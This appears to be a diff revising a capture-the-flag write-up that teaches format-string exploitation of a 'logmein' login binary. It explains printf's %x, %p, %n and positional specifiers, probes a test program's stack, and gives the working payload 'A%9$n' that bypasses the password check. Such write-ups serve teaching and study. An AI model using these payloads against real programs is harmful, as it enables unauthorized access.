@@ -91,9 +91,29 @@ printf((char *)(input_p+1));
 
 The fact the buffer is printed out with `printf()` and it's on it's own line means we could use the [format exploit](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html), but it needs some work to find out how.
 
-First we need to find where the `input_p` variable sits on the stack in relation to the current stack pointer. I've found it difficult to see a relationship between what comes out when using the format exploit, and what values are on the stack. Without this it's difficult to know what offset is needed to change the `input_p` address.
+Basically, the exploit uses formatters passed to `printf()` to manipulate memory:
+* `%x` - display an argument as hexadecimal
+* `%p` - display an argument as a pointer
+* `%n` - is passed a pointer argument - a pointer to a signed int - and sets that signed int to the number of character printed out so far.
 
-I wrote a small program to try out various things with the format exploit until I understand what's actually happening. The program was:
+Examples:
+```
+printf("The number 180 in hex is: %x \n", 70);
+The number 180 in hex is: b4
+
+printf("My pointer points at memory location: %p \n", my_pointer);
+My pointer points at memory location: 0x7fe5fb3b5700
+
+printf("I need to store the number of characters I've printed into my_pointer!%n \n", my_pointer);
+I need to store the number of characters I've printed into my_pointer!
+// The memory at address my_pointer will now contain 70 (the number of characters in the sentence above)
+```
+
+The fact that `%n` can send a number to a memory address means that we don't need to manipulate the pointer, as I thought above, just to get that pointer to be used as an argument for the `%n` value.
+
+First we can use `%x` or `%p` to find where the `input_p` variable sits on the stack in relation to the current stack pointer. I've found it difficult to see a relationship between what comes out when using the format exploit, and what values are on the stack for the challenge code. Therefore, I decided to write a small program that could take more format specifiers (the challenge is limited to 20 charactes in the username), and use the results of those tests to try to understand what is actually happening.
+
+The first pass of the program was:
 ```c
 #include <stdio.h>
 
@@ -121,12 +141,12 @@ You entered: AAAA 1293020 86cb0780 d 86ebe700 d 2b638938 0 41414141 25207825 207
 
 > Note also: We actually get a warning about the format exploit.
 
-When we run it (passing in AAAA followed by 20 `%x` formatters (meaning "print hex values")), as there are no actual arguments to `printf()` in the code, it goes and gets its arguments from the stack to fill the formats. You can see that the 8th hex value returned is 0x41414141, which are the 4 'A's (0x41 in ASCII) we started the string with. This is followed by our %x characters, though they seem to be in an odd order and missing some bits. This is because `%x` is only showing the least-significant 32-bits. If we use `%p`, this shows the full 64-bit values and we see:
+When we run it (passing in AAAA followed by 20 `%x` formatters), as there are no actual arguments to `printf()` in the code, it goes and gets its arguments from the stack to fill the formats. You can see that the 8th hex value returned is 0x41414141, which are the 4 'A's (0x41 in ASCII) we started the string with. This is followed by our %x (0x25, 0x78 and 0x20 for the space) characters, though they seem to be in an odd order and missing some bits. This is because `%x` is only showing the least-significant 32-bits. If we use `%p`, this shows the full 64-bit values and we see:
 ```
 > python -c "print ('AAAA ' + '%p '*20)" | ./test_p 
 You entered: AAAA 0x1621020 0x7f9a67ab9780 0xd 0x7f9a67cc7700 0xd 0x7ffde8020238 0x100000000 0x2070252041414141 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20 (nil) 0x400650 0x400500 0x7ffde8020230
 ```
-Here you can see the bytes are reversed - our 0x41414141 is displayed in the least-significant bytes of the 8th value, and it has the first part of the `%x`s in the most-significant bytes. This is clearer if we use ABCD instead of AAAA:
+Here you can see the bytes are reversed - our 0x41414141 is displayed in the least-significant bytes of the 8th value, and it has the first part of the `%x`s from our input in the most-significant bytes. This is clearer if we use ABCD instead of AAAA:
 ```
 > python -c "print ('ABCD ' + '%p '*20)" | ./test_p 
 You entered: ABCD 0x2514020 0x7f8e3e020780 0xd 0x7f8e3e22e700 0xd 0x7fff26cca578 0x100000000 0x2070252044434241 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa20 (nil) 0x400650 0x400500 0x7fff26cca570
@@ -142,7 +162,7 @@ You entered: ABCD 44434241
 ABCD %8$p
 You entered: ABCD 0x2438252044434241
 ```
-That worked!
+This works because, with `printf()`, we are allowed to specify a particular argument in the argument list to use, rather than the next available one. Using the `%i$` (where `i` is an integer specifying the argument number) instead of just `%` in any of our formatters enables us to get that argument. In `%8$x`, we are getting the 8th argument (or stack memory location after the current position in this case) and passing that to a `%x` formatter.
 
 Let's now see how we get on if we put the address on the heap. The code was changed to:
 ```c
@@ -161,13 +181,13 @@ int main(int argc, char **argv)
   return 0;
 }
 ```
-This was built with the same `gcc` build command. Now it's very similar to the code for this challenge. So what do we see if we use the techniques above:
+This was built with the same `gcc` build command as before. Now it's very similar to the code for this challenge. So what do we see if we use the techniques above:
 ```
 > python -c "print ('ABCD ' + '%p '*20)" | ./test_p
 buffer is: 0x1e9c010
 You entered: ABCD 0x400770 0x7fe5fb1a7780 0xd 0x7fe5fb3b5700 0xd 0x7ffd2209a288 0x100400550 0x7ffd2209a280 0x1e9c010 0x4006d0 0x7fe5fae01830 (nil) 0x7ffd2209a288 0x100000000 0x400646 (nil) 0x9c55f348bfd89065 0x400550 0x7ffd2209a280 (nil)
 ```
-We can see at the 9th location we have the address. We can isolate this with:
+We can see at the 9th location we have the `buffer` address. We can isolate this with:
 ```
 > ./test_p 
 buffer is: 0x1866010
@@ -180,18 +200,18 @@ Now we know that this program puts the address in the 9th location, we should be
 > python -c "print ('ABCD ' + '%p '*20)" > test_inp.txt
 ```
 
-When I run this in the debugger, the address from the `calloc()` (on the first run 0x01e06010) can be seen at 0x7ffc81f4c598 on the stack:
+When I run this in the debugger, the address from the `calloc()` (on the example run it's 0x01e06010) can be seen at 0x7ffc81f4c598 on the stack:
 
 ![Stack output](memory3.png)
 
-And in the output is appears at location 9 in the list as before:
+And in the output it appears at location 9 in the list as before:
 ```
 buffer is: 0x1e06010
 You entered: ABCD 0x400770 0x7fb506f53780 0xd 0x7fb507161700 0xd 0x7ffc81f4c688 0x100400550 0x7ffc81f4c680 0x1e06010 0x4006d0 0x7fb506bad830 (nil) 0x7ffc81f4c688 0x100000000 0x400646 (nil) 0xce6ab2db357608f7 0x400550 0x7ffc81f4c680 (nil)
 ```
-Here we can see that the stack values around our address (in the image) can be seen to match the output, but other values don't. This must mean the stack values change during the `printf()` (the image was taken immediately before the call to `printf()`), which is why I struggled to find values when trying to analyse the challenge code.
+Here we can see in the image above that the stack values close to our address can be seen to match the output, but other values don't. This must mean the stack values change during the `printf()` (the image was taken immediately before the call to `printf()`), which is why I struggled to match values up when trying to analyse the challenge code.
 
-Writing the temp program let me look at more stack values than the challenge, because the challenge truncates at 20 characters (though I could have tested with moving the pointer to, say, the 5th and looking after that - `%5$p %p %p ...`).
+Now that I understand the format exploit better, I realise I could just have used something like `%5$p %p %p ...` to look further down the stack in the challenge program, and I would have seen where the address was.
 
 The programs were so similar, that I thought I could perhaps just try the 9th value in the challenge:
 ```
@@ -203,8 +223,7 @@ Enter password for user: 0x19bd010
 
 Invalid login information.
 ```
-
-Now, can I use `%n` to write to that location? `%n` writes the number of characters printed so far by this `printf()` statement, to the pointer specified. If we move to the 9th address, the number of characters will be sent to the start of the input buffer, making `test eax, eax` pass. Therefore, `A%9$n` should send 1 (the letter A is the only character printed so far) to the address at location 9.
+Now, can I use `%n` to write to that location? If we move the `%n` to the 9th argument (address), the number of characters will be sent to the start of the input buffer, making `test eax, eax` pass. Therefore, `A%9$n` should send 1 (the letter A is the only character printed) to the address at 'argument' 9.
 ```
 > ./logmein 
 user = 0x1c83010
@@ -227,6 +246,3 @@ Successfully logged in!
 ```
 
 This gave me the flag!
-
-
-
